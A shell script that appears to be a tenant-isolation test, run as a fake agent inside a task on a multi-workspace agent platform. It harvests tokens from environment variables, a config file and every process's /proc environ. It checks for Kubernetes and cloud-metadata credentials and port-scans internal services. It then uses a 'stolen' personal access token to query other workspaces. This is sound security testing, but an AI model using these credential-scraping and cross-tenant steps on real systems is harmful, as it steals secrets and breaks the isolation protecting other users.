#!/bin/sh
# T7/T8 isolation probe, run by the fake agent inside a task. Prints findings
# with secrets cut to a 4-char prefix. Usage: probe.sh <other-workspace-id> <other-agent-id>
OTHER_WS=$1; OTHER_AGENT=$2
pfx() { cut -c1-4; }
echo "uid=$(id -u) user=$(id -un)"
echo "task_token_prefix=$(printf %s "$MULTICA_TOKEN" | pfx)"
echo "cfg_json_readable=$([ -r $HOME/.multica/config.json ] && echo yes || echo no) cfg_token_prefix=$(sed -n 's/.*"token": *"\([^"]*\)".*/\1/p' $HOME/.multica/config.json 2>/dev/null | pfx)"
echo "daemon_process_env_token_prefixes=$(cat /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n' | grep '^MULTICA_TOKEN=' | cut -d= -f2 | pfx | sort -u | tr '\n' ',')"
echo "other_task_dirs_visible=$(ls -d $MULTICA_TASK_WORKSPACES_ROOT/*/* 2>/dev/null | wc -l)"
echo "other_task_env_files_readable=$(ls $MULTICA_TASK_WORKSPACES_ROOT/*/*/workdir/.fake-last-env.txt 2>/dev/null | wc -l)"
echo "service_link_env_vars=$(env | grep -c '_SERVICE_HOST=')"
echo "k8s_sa_token_mounted=$([ -r /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo yes || echo no)"
for hp in postgres.mr-poc:5432 server.mr-poc:8080 kubernetes.default.svc:443 169.254.169.254:80; do
  h=${hp%%:*}; p=${hp##*:}
  echo "net_$h:$p=$(nc -z -w2 $h $p >/dev/null 2>&1 && echo OPEN || echo blocked)"
done
echo "daemon_local_api($MULTICA_DAEMON_PORT)=$(curl -s -m2 -o /dev/null -w %{http_code} http://127.0.0.1:${MULTICA_DAEMON_PORT:-0}/ 2>/dev/null)"
api() { curl -s -m5 -o /dev/null -w %{http_code} -H "Authorization: Bearer $MULTICA_TOKEN" -H "X-Workspace-ID: $1" "$MULTICA_SERVER_URL$2"; }
echo "task_token->own_ws_runtimes=$(api $MULTICA_WORKSPACE_ID /api/runtimes)"
echo "task_token->OTHER_ws_runtimes=$(api $OTHER_WS /api/runtimes)"
echo "task_token->OTHER_agent_tasks=$(api $MULTICA_WORKSPACE_ID /api/agents/$OTHER_AGENT/tasks)"
wsids() { curl -s -m5 -H "Authorization: Bearer $1" -H "X-Workspace-ID: $2" "$MULTICA_SERVER_URL$3" | grep -o '"workspace_id":"[^"]*"' | sort -u | tr '\n' ' '; }
echo "task_token+OTHER_ws_header -> returned workspace_ids: [$(wsids "$MULTICA_TOKEN" "$OTHER_WS" /api/runtimes)] (own=$MULTICA_WORKSPACE_ID other=$OTHER_WS)"
PAT=$(sed -n 's/.*"token": *"\([^"]*\)".*/\1/p' $HOME/.multica/config.json 2>/dev/null)
echo "stolen_PAT->workspaces visible: $(curl -s -m5 -H "Authorization: Bearer $PAT" "$MULTICA_SERVER_URL/api/workspaces" | grep -o '"slug":"[^"]*"' | tr '\n' ' ')"
echo "stolen_PAT->OTHER_ws_runtimes=$(curl -s -m5 -o /dev/null -w %{http_code} -H "Authorization: Bearer $PAT" -H "X-Workspace-ID: $OTHER_WS" "$MULTICA_SERVER_URL/api/runtimes")"
